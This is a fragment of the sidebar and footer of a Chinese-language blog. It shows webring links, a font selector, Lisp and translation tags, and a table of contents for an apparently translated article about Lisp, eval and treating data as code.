src="/assets/img/6838639.png" alt="FSF appeal" /></a></li></ul><div><a href="https://xn--sr8hvo.ws/previous">←</a><a href="https://xn--sr8hvo.ws">IndieWeb Webring 💍</a><a href="https://xn--sr8hvo.ws/next">→</a></div><div><a href="https://fediring.net/previous?host=blog.southfox.me">←</a><a href="https://fediring.net">Fediring 💍</a><a href="https://fediring.net/next?host=blog.southfox.me">→</a></div></div><div class="widget"><h4>设置</h4><div><label for="font-select">字体设置：</label><select id="font-select"><option value="plain">普通</option><option value="zpix">像素</option></select></div></div><div class="widget"><h4>标签</h4><ul><li><a href="/tag/Lisp">Lisp</a></li><li><a href="/tag/翻译">翻译</a></li></ul></div><div class="widget"><h4>目录</h4><ul><li><a href="#绘画">绘画</a></li><li><a href="#挑战">挑战</a></li><li><a href="#Eval">Eval</a></li><li><a href="#初步想法">初步想法</a></li><li><a href="#初步简化">初步简化</a></li><li><a href="#更多力量">更多力量</a></li><li><a href="#进一步简化">进一步简化</a></li><li><a href="#更强大的力量">更强大的力量</a></li><li><a href="#推向极限：目标">推向极限：目标</a></li><li><a href="#推向极限：关键">推向极限：关键</a></li><li><a href="#推向极限：执行">推向极限：执行</a></li><li><a href="#试试看">试试看</a></li><li><a href="#惊喜">惊喜</a></li><li><a href="#没什么特别的">没什么特别的</a></li><li><a href="#数据即代码">数据即代码</a></li><li><a href="#结构编辑">结构编辑</a></li><li><a href="#你发现了什么">你发现了什么</a></li><li><a href="#发现？">发现？</a></li><li><a href="#结尾">结尾</a></li><li><a href="#脚注">脚注</a></li></ul></div></div></div><footer class="footer"><div class="copyright"><div><p>© SouthFox 2026 ,Font by <a href="https://github.com/SolidZORO/zpix-pixel-font">Zpix</a></p></div><div><p>Power by <a href="https://dthompson.us/projects/haunt.html">haunt</a> ,source can be found <a href="https://git.southfox.me/southfox/blog">here</a></p></div></div></footer></body></html>